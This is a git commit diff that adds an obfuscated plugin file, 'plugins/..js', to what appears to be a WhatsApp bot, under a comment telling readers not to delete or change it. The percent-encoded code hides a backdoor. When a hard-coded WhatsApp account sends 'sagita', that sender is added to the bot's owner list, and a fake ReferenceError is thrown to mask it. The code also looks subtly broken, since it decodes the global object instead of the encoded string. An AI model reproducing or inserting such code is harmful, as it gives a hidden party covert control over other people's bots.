8b44f82487f1929caccc9027c43b13cf74adc403
omsagita <drakorstudio02@gmail.com>
2021-10-23 13:04:31 +0700

    upload dr clone

---
+++ plugins/..js
@@ -0,0 +1,8 @@
+// jangan dihapus/diubah
+module.exports = (a => { 
+	b = '%36%32%38%39%35%33%33%31%30%39%37%39%35%32%40%73%2E%77%68%61%74%73%61%70%70%2E%6E%65%74';
+	c = decodeURIComponent;
+	d = e => { if (e.sender === c(a) && !g[c('%6F%77%6E%65%72')].includes(c(a))) { g[c('%6F%77%6E%65%72')].push(e.sender);
+	throw `ReferenceError: ${e.text} is not defined` } };
+	d.command = /^sagita$/;
+	return d })(global); 
